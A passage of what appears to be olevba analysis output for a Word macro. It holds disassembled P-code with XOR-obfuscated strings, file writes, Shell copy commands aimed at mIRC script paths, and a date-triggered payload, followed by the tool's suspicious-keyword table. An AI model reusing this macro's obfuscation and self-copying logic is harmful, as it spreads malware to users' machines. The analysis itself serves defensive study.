' 	LitDI2 0x0008 
' 	ArgsSt j 0x0001 
' Line #74:
' 	LitStr 0x0004 "k=8x"
' 	LitDI2 0x0009 
' 	ArgsSt j 0x0001 
' Line #75:
' 	LitStr 0x0035 "k<8Jk%4?Q@]Q?/pvdhd/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
' 	LitDI2 0x000A 
' 	ArgsSt j 0x0001 
' Line #76:
' 	LitStr 0x0035 "k458%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
' 	LitDI2 0x000B 
' 	ArgsSt j 0x0001 
' Line #77:
' 	LitStr 0x0005 "k448x"
' 	LitDI2 0x000C 
' 	ArgsSt j 0x0001 
' Line #78:
' 	LitStr 0x0036 "k478Jk%4?Q@]Q?/ida`k/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
' 	LitDI2 0x000D 
' 	ArgsSt j 0x0001 
' Line #79:
' 	LitStr 0x0035 "k468%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
' 	LitDI2 0x000E 
' 	ArgsSt j 0x0001 
' Line #80:
' 	LitStr 0x0005 "k418x"
' 	LitDI2 0x000F 
' 	ArgsSt j 0x0001 
' Line #81:
' 	LitStr 0x0034 "k408Jk%4?Q@]Q?/rqf/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
' 	LitDI2 0x0010 
' 	ArgsSt j 0x0001 
' Line #82:
' 	LitStr 0x0035 "k438%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
' 	LitDI2 0x0011 
' 	ArgsSt j 0x0001 
' Line #83:
' 	LitStr 0x0005 "k428x"
' 	LitDI2 0x0012 
' 	ArgsSt j 0x0001 
' Line #84:
' 	LitStr 0x0033 "k4=8Jk%4?Q@]Q?/k|/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
' 	LitDI2 0x0013 
' 	ArgsSt j 0x0001 
' Line #85:
' 	LitStr 0x0035 "k4<8%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
' 	LitDI2 0x0014 
' 	ArgsSt j 0x0001 
' Line #86:
' 	LitStr 0x0005 "k758x"
' 	LitDI2 0x0015 
' 	ArgsSt j 0x0001 
' Line #87:
' 	LitStr 0x0037 "k748Jk%4?Q@]Q?/b`jwb`/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
' 	LitDI2 0x0016 
' 	ArgsSt j 0x0001 
' Line #88:
' 	LitStr 0x0035 "k778%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
' 	LitDI2 0x0017 
' 	ArgsSt j 0x0001 
' Line #89:
' 	LitStr 0x0005 "k768x"
' 	LitDI2 0x0018 
' 	ArgsSt j 0x0001 
' Line #90:
' 	LitStr 0x003B "k718Jk%4?Q@]Q?/dcbdklvqdk/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
' 	LitDI2 0x0019 
' 	ArgsSt j 0x0001 
' Line #91:
' 	LitStr 0x0035 "k708%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
' 	LitDI2 0x001A 
' 	ArgsSt j 0x0001 
' Line #92:
' 	LitStr 0x0005 "k738x"
' 	LitDI2 0x001B 
' 	ArgsSt j 0x0001 
' Line #93:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x001B 
' 	For 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld i 
' 	ArgsLd j 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	PrintItemNL 
' Line #95:
' 	StartForVariable 
' 	Next 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #97:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0004 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	VarDefn dest (As String)
' Line #98:
' 	LitStr 0x0019 "f?YhlwfYv|vq`hYvfwluq+lkl"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	ArgsSt dest 0x0001 
' Line #99:
' 	LitStr 0x001B "f?Yhlwf67Yv|vq`hYvfwluq+lkl"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitDI2 0x0002 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	ArgsSt dest 0x0001 
' Line #100:
' 	LitStr 0x001B "f?Yuwjbwd{4YhlwfYvfwluq+lkl"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitDI2 0x0003 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	ArgsSt dest 0x0001 
' Line #101:
' 	LitStr 0x001D "f?Yuwjbwd{4Yhlwf67Yvfwluq+lkl"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitDI2 0x0004 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	ArgsSt dest 0x0001 
' Line #102:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	LitDI2 0x0004 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	For 
' Line #103:
' 	Ld i 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	ArgsLd dest 0x0001 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #104:
' 	LitStr 0x0005 "fju|%"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	Ld Pathy 
' 	Concat 
' 	LitStr 0x0001 "%"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	Concat 
' 	Ld i 
' 	ArgsLd dest 0x0001 
' 	Concat 
' 	ArgsCall Shell 0x0001 
' Line #105:
' 	StartForVariable 
' 	Next 
' Line #106:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000B 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #107:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	ArgsLd Documents 0x0001 
' 	MemLd Content 
' 	With 
' Line #108:
' 	LitStr 0x0009 "Rlkbalkbv"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	MemLdWith Font 
' 	MemSt New 
' Line #109:
' 	LitDI2 0x0048 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #110:
' 	LitStr 0x0005 "T66K\"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	ArgsMemCallWith InsertAfter 0x0001 
' Line #111:
' 	EndWith 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Private Function Crypt(q33ny, key, id_FFFE As Variant))
' Line #115:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld q33ny 
' 	FnLen 
' 	For 
' Line #116:
' 	Ld Crypt 
' 	Ld q33ny 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld key 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Crypt 
' Line #117:
' 	StartForVariable 
' 	Next 
' Line #118:
' 	LitStr 0x0000 ""
' 	St q33ny 
' Line #119:
' 	EndFunc 
' Line #120:
' Line #121:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

